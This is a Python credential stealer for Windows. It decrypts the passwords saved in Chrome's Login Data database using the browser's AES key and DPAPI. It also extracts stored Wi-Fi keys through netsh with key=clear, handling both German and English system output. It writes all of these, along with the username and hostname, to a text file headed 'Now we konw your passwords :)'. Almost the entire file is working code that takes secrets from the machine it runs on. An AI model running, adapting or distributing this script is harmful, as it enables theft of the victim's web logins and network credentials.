import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import subprocess
import getpass
import socket

PWinFileAll = open("WifiPasswords.txt", "w")

username = getpass.getuser()
homedir = os.path.expanduser("~")
PWinFileAll.write("####################################################################################################\n\n")
PWinFileAll.write("Now we konw your passwords :)\n\n")
PWinFileAll.write("Systeminformations:\n")
PWinFileAll.write("Username:\t"+getpass.getuser()+"\n")
PWinFileAll.write("Username:\t"+socket.gethostname()+"\n\n")
PWinFileAll.write("####################################################################################################\n\n\n\n\n")

PWinFileAll.write("####################################################################################################\n\n")
PWinFileAll.write("Chrome Passwords:\n\n")
PWinFileAll.write("####################################################################################################\n\n\n")

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            PWinFileAll.write(f"Origin URL: {origin_url} \n")
            PWinFileAll.write(f"Action URL: {action_url} \n")
            PWinFileAll.write(f"Username: {username} \n")
            PWinFileAll.write(f"Password: {password} \n")
            PWinFileAll.write("\n\n")

            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
if __name__ == "__main__":
    main()
PWinFileAll.write("####################################################################################################\n\n")


PWinFileAll.write("Wifi Passwords:\n\n")
PWinFileAll.write("####################################################################################################\n\n")


# Deutsche Sprache
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp850').split('\n')
wifis = [line.split(":")[1][1:-1] for line in data if  "Profil für alle Benutzer" in line]
for wifi in wifis:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp850').split('\n')
    results = [line.split(":")[1][1:-1] for line in results if 'Schlüsselinhalt' in line]
    try:
        PWinFileAll.write(f'Name: {wifi}, Password: {results[0]}')
        PWinFileAll.write("\n")
        print(f'Name: {wifi}, Password: {results[0]}')
    except IndexError:
        print(f'Name: {wifi}, Password: Cannot be read!')
        PWinFileAll.write(f'Name: {wifi}, Password: Cannot be read!')
        PWinFileAll.write("\n")


# Englische Sprache
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp850').split('\n')
wifis = [line.split(":")[1][1:-1] for line in data if  "All User Profile" in line]
for wifi in wifis:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp850').split('\n')
    results = [line.split(":")[1][1:-1] for line in results if 'Key Content' in line]
    try:
        PWinFileAll.write(f'Name: {wifi}, Password: {results[0]}\n')
        print(f'Name: {wifi}, Password: {results[0]}')
    except IndexError:
        print(f'Name: {wifi}, Password: Cannot be read!')
        PWinFileAll.write(f'Name: {wifi}, Password: Cannot be read!')

PWinFileAll.close()